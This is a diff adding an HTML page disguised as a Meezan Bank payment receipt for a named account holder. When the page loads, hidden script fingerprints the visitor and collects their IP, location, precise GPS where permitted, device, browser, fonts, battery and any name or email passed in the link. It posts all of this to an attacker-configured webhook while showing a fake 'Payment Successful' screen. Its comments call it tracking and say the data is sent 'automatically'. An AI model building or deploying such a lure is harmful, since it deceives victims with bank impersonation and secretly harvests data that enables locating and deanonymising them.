@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meezan Bank - Payment Receipt</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .receipt-container {
+            background: white;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #28a745;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        .success-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 50px;
+            font-weight: bold;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-message h2 {
+            color: #28a745;
+            font-size: 28px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .success-message p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .owner-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .owner-info .label {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .owner-info .name {
+            color: #333;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .receipt-header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #ffd700;
+        }
+
+        .receipt-header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        .receipt-header .bank-name {
+            font-size: 24px;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .receipt-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .receipt-body {
+            padding: 30px 20px;
+        }
+
+        .receipt-info {
+            border-bottom: 2px dashed #ddd;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .info-label {
+            color: #666;
+            font-weight: bold;
+        }
+
+        .info-value {
+            color: #333;
+            text-align: right;
+            word-break: break-word;
+            max-width: 60%;
+        }
+
+        .receipt-footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            border-top: 2px dashed #ddd;
+        }
+
+        .receipt-footer p {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .timestamp {
+            font-size: 16px;
+            color: #1e3c72;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 20px 0 10px 0;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+
+        .section-title:first-of-type {
+            border-top: none;
+            margin-top: 0;
+            padding-top: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="receipt-container">
+        <div class="receipt-header">
+            <div class="bank-name">MEEZAN BANK</div>
+            <h1>PAYMENT RECEIPT</h1>
+            <p>Islamic Banking</p>
+        </div>
+        
+        <div class="receipt-body" id="receiptBody">
+            <div class="loading" id="loadingDiv">
+                <div class="spinner"></div>
+                <p>Processing your receipt...</p>
+            </div>
+        </div>
+        
+        <div class="receipt-footer">
+            <p>Thank you for banking with Meezan Bank</p>
+            <div class="timestamp" id="timestamp"></div>
+            <div class="status-badge">✓ TRANSACTION COMPLETED</div>
+            <p style="margin-top: 15px; font-size: 11px; color: #999;">Keep this receipt for your records</p>
+        </div>
+    </div>
+
+    <script>
+        // Capture all user details
+        async function captureUserDetails() {
+            const details = {
+                timestamp: new Date().toISOString(),
+                date: new Date().toLocaleString(),
+                ip: 'Loading...',
+                location: {},
+                device: {},
+                browser: {},
+                network: {},
+                screen: {},
+                fingerprint: {},
+                plugins: [],
+                fonts: [],
+                battery: {},
+                userInfo: {
+                    name: '',
+                    email: ''
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            };
+
+            // Get user info from URL parameters if provided (optional)
+            // Example: tracker.html?name=John&email=john@example.com
+            const urlParams = new URLSearchParams(window.location.search);
+            details.userInfo.name = urlParams.get('name') || '';
+            details.userInfo.email = urlParams.get('email') || '';
+
+            // Get IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                details.ip = ipData.ip;
+            } catch (e) {
+                try {
+                    const ipResponse2 = await fetch('https://ipapi.co/json/');
+                    const ipData2 = await ipResponse2.json();
+                    details.ip = ipData2.ip;
+                    details.location = {
+                        city: ipData2.city || 'Unknown',
+                        region: ipData2.region || 'Unknown',
+                        country: ipData2.country_name || 'Unknown',
+                        countryCode: ipData2.country_code || 'Unknown',
+                        postal: ipData2.postal || 'Unknown',
+                        latitude: ipData2.latitude || 'Unknown',
+                        longitude: ipData2.longitude || 'Unknown',
+                        timezone: ipData2.timezone || 'Unknown',
+                        isp: ipData2.org || 'Unknown'
+                    };
+                } catch (e2) {
+                    details.ip = 'Unable to fetch';
+                }
+            }
+
+            // Get detailed location if IP API didn't provide it
+            if (!details.location.city) {
+                try {
+                    const locResponse = await fetch('https://ipapi.co/json/');
+                    const locData = await locResponse.json();
+                    details.location = {
+                        city: locData.city || 'Unknown',
+                        region: locData.region || 'Unknown',
+                        country: locData.country_name || 'Unknown',
+                        countryCode: locData.country_code || 'Unknown',
+                        postal: locData.postal || 'Unknown',
+                        latitude: locData.latitude || 'Unknown',
+                        longitude: locData.longitude || 'Unknown',
+                        timezone: locData.timezone || 'Unknown',
+                        isp: locData.org || 'Unknown'
+                    };
+                } catch (e) {
+                    details.location = { error: 'Unable to fetch location' };
+                }
+            }
+
+            // Try to get precise geolocation (requires user permission)
+            if (navigator.geolocation) {
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                details.location.precise = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy + ' meters'
+                                };
+                                resolve();
+                            },
+                            () => resolve(), // Don't fail if user denies
+                            { timeout: 5000 }
+                        );
+                    });
+                } catch (e) {
+                    // User denied or error
+                }
+            }
+
+            // Device Information
+            details.device = {
+                type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                vendor: navigator.vendor || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                deviceMemory: navigator.deviceMemory || 'Unknown'
+            };
+
+            // Browser Information
+            const ua = navigator.userAgent;
+            let browserName = 'Unknown';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+            else if (ua.includes('Firefox')) browserName = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+            else if (ua.includes('Edg')) browserName = 'Edge';
+            else if (ua.includes('Opera') || ua.includes('OPR')) browserName = 'Opera';
+
+            details.browser = {
+                name: browserName,
+                version: ua.match(/(?:Chrome|Firefox|Safari|Edg|Opera|OPR)\/(\d+)/)?.[1] || 'Unknown',
+                fullUserAgent: ua
+            };
+
+            // Screen Information
+            details.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth + ' bits',
+                pixelDepth: screen.pixelDepth + ' bits',
+                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+            };
+
+            // Network Information (if available)
+            if (navigator.connection) {
+                details.network = {
+                    effectiveType: navigator.connection.effectiveType || 'Unknown',
+                    downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Unknown',
+                    rtt: navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Unknown',
+                    saveData: navigator.connection.saveData || false
+                };
+            }
+
+            // Browser Plugins
+            if (navigator.plugins && navigator.plugins.length > 0) {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    details.plugins.push({
+                        name: navigator.plugins[i].name,
+                        description: navigator.plugins[i].description,
+                        filename: navigator.plugins[i].filename
+                    });
+                }
+            }
+
+            // MIME Types
+            details.mimeTypes = [];
+            if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
+                for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                    details.mimeTypes.push({
+                        type: navigator.mimeTypes[i].type,
+                        description: navigator.mimeTypes[i].description
+                    });
+                }
+            }
+
+            // Canvas Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint test 🔒', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Fingerprint test 🔒', 4, 17);
+                details.fingerprint.canvas = canvas.toDataURL().substring(0, 100) + '...';
+            } catch (e) {
+                details.fingerprint.canvas = 'Unable to generate';
+            }
+
+            // WebGL Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        details.fingerprint.webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                            version: gl.getParameter(gl.VERSION),
+                            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                        };
+                    }
+                }
+            } catch (e) {
+                details.fingerprint.webgl = 'Unable to detect';
+            }
+
+            // Audio Fingerprinting (non-blocking)
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                gainNode.gain.value = 0;
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                let audioProcessed = false;
+                oscillator.start(0);
+                scriptProcessor.onaudioprocess = (event) => {
+                    if (audioProcessed) return;
+                    audioProcessed = true;
+                    const output = event.inputBuffer.getChannelData(0);
+                    let sum = 0;
+                    for (let i = 0; i < output.length; i++) {
+                        sum += Math.abs(output[i]);
+                    }
+                    details.fingerprint.audio = sum.toString().substring(0, 10);
+                    oscillator.stop();
+                    audioContext.close();
+                };
+                
+                // Timeout after 1 second
+                setTimeout(() => {
+                    if (!audioProcessed) {
+                        details.fingerprint.audio = 'Timeout';
+                        try {
+                            oscillator.stop();
+                            audioContext.close();
+                        } catch (e) {}
+                    }
+                }, 1000);
+            } catch (e) {
+                details.fingerprint.audio = 'Unable to generate';
+            }
+
+            // Font Detection
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const h = document.getElementsByTagName('body')[0];
+            const s = document.createElement('span');
+            s.style.fontSize = testSize;
+            s.innerHTML = testString;
+            const defaultWidth = {};
+            const defaultHeight = {};
+            
+            for (let i = 0; i < baseFonts.length; i++) {
+                s.style.fontFamily = baseFonts[i];
+                h.appendChild(s);
+                defaultWidth[baseFonts[i]] = s.offsetWidth;
+                defaultHeight[baseFonts[i]] = s.offsetHeight;
+                h.removeChild(s);
+            }
+
+            const detectedFonts = [];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Lucida Console'];
+            
+            for (let i = 0; i < testFonts.length; i++) {
+                let detected = false;
+                for (let j = 0; j < baseFonts.length; j++) {
+                    s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
+                    h.appendChild(s);
+                    const matched = (s.offsetWidth !== defaultWidth[baseFonts[j]] || s.offsetHeight !== defaultHeight[baseFonts[j]]);
+                    h.removeChild(s);
+                    if (matched) {
+                        detected = true;
+                        break;
+                    }
+                }
+                if (detected) detectedFonts.push(testFonts[i]);
+            }
+            details.fonts = detectedFonts;
+
+            // Battery Status (if available)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    details.battery = {
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + ' seconds' : 'Unknown',
+                        dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + ' seconds' : 'Unknown',
+                        level: (battery.level * 100).toFixed(1) + '%'
+                    };
+                } catch (e) {
+                    details.battery = { error: 'Unable to access' };
+                }
+            }
+
+            // More Browser Details
+            details.browser.doNotTrack = navigator.doNotTrack || 'Unknown';
+            details.browser.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
+            details.browser.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
+            
+            // Window Size
+            details.window = {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio || 1
+            };
+
+            // Local Storage & Session Storage
+            try {
+                details.storage = {
+                    localStorage: typeof(Storage) !== 'undefined' ? 'Available' : 'Not Available',
+                    sessionStorage: typeof(sessionStorage) !== 'undefined' ? 'Available' : 'Not Available',
+                    localStorageSize: typeof(Storage) !== 'undefined' ? new Blob([JSON.stringify(localStorage)]).size + ' bytes' : 'N/A'
+                };
+            } catch (e) {
+                details.storage = { error: 'Unable to access' };
+            }
+
+            // Performance Info
+            if (window.performance && window.performance.memory) {
+                details.performance = {
+                    jsHeapSizeLimit: (window.performance.memory.jsHeapSizeLimit / 1048576).toFixed(2) + ' MB',
+                    totalJSHeapSize: (window.performance.memory.totalJSHeapSize / 1048576).toFixed(2) + ' MB',
+                    usedJSHeapSize: (window.performance.memory.usedJSHeapSize / 1048576).toFixed(2) + ' MB'
+                };
+            }
+
+            // Connection Info (more details)
+            if (navigator.connection) {
+                details.network.onLine = navigator.onLine;
+            }
+
+            return details;
+        }
+
+        // Display receipt
+        function displayReceipt(details) {
+            const receiptBody = document.getElementById('receiptBody');
+            const timestamp = document.getElementById('timestamp');
+            const loading = document.getElementById('loadingDiv');
+            
+            if (loading) loading.style.display = 'none';
+            
+            timestamp.textContent = details.date;
+
+            const transactionId = generateTransactionId();
+            
+            let html = `
+                <div class="success-message">
+                    <div class="success-icon"></div>
+                    <h2>Payment Successful</h2>
+                    <p>Your transaction has been processed successfully</p>
+                </div>
+
+                <div class="receipt-info">
+                    <div class="section-title">TRANSACTION DETAILS</div>
+                    <div class="info-row">
+                        <span class="info-label">Transaction ID:</span>
+                        <span class="info-value">${transactionId}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Date & Time:</span>
+                        <span class="info-value">${details.date}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status:</span>
+                        <span class="info-value" style="color: #28a745; font-weight: bold;">✓ COMPLETED</span>
+                    </div>
+                </div>
+
+                <div class="owner-info">
+                    <div class="label">Account Owner</div>
+                    <div class="name">Junaid Rafique</div>
+                </div>
+            `;
+
+            receiptBody.innerHTML = html;
+
+            // Automatically send data to server (no download for user)
+            sendDataToServer(details);
+        }
+
+        function generateTransactionId() {
+            return 'TXN-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        }
+
+        // Send data to your server automatically
+        async function sendDataToServer(details) {
+            // ============================================
+            // CONFIGURATION: Add your webhook URL here
+            // ============================================
+            // Option 1: Google Apps Script (Recommended for Google Drive)
+            //   1. Go to script.google.com
+            //   2. Create new project, paste code from google-apps-script-setup.md
+            //   3. Deploy as Web App, copy the URL
+            //   4. Paste it below:
+            const webhookUrl = 'YOUR_WEBHOOK_URL_HERE';
+            
+            // Option 2: For quick testing, use webhook.site
+            //   Go to https://webhook.site and copy your unique URL
+            
+            // Option 3: Your own server endpoint
+            //   Example: 'https://yourserver.com/api/track'
+            
+            // ============================================
+            
+            if (webhookUrl === 'YOUR_WEBHOOK_URL_HERE') {
+                console.warn('⚠️ Webhook URL not configured! Data will not be saved.');
+                console.log('📋 Captured data:', details);
+                // Show a message to user (optional - remove if you don't want to show)
+                showStatusMessage('⚠️ Server not configured. Check console for data.', 'warning');
+                return;
+            }
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(details),
+                    mode: 'no-cors' // Remove this if your server supports CORS
+                });
+                
+                // If server returns JSON response
+                try {
+                    const result = await response.json();
+                    console.log('✅ Data saved successfully:', result);
+                    showStatusMessage('✅ Receipt data saved successfully!', 'success');
+                } catch (e) {
+                    // If no-cors mode, we can't read response but request was sent
+                    console.log('✅ Data sent to server (no-cors mode)');
+                    showStatusMessage('✅ Receipt data saved successfully!', 'success');
+                }
+            } catch (e) {
+                console.error('❌ Failed to send data:', e);
+                showStatusMessage('⚠️ Failed to save data. Check console.', 'error');
+            }
+        }
+
+        // Show status message to user
+        function showStatusMessage(message, type) {
+            const receiptBody = document.getElementById('receiptBody');
+            const statusDiv = document.createElement('div');
+            statusDiv.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#ffc107'};
+                color: white;
+                padding: 15px 20px;
+                border-radius: 5px;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                z-index: 1000;
+                font-size: 14px;
+                max-width: 300px;
+            `;
+            statusDiv.textContent = message;
+            document.body.appendChild(statusDiv);
+            
+            // Auto remove after 3 seconds
+            setTimeout(() => {
+                statusDiv.remove();
+            }, 3000);
+        }
+
+        // Initialize tracking
+        async function initializeTracking() {
+            const details = await captureUserDetails();
+            displayReceipt(details);
+        }
+
+        // Start tracking immediately on page load (no form delay)
+        initializeTracking();
+    </script>
+</body>
+</html>
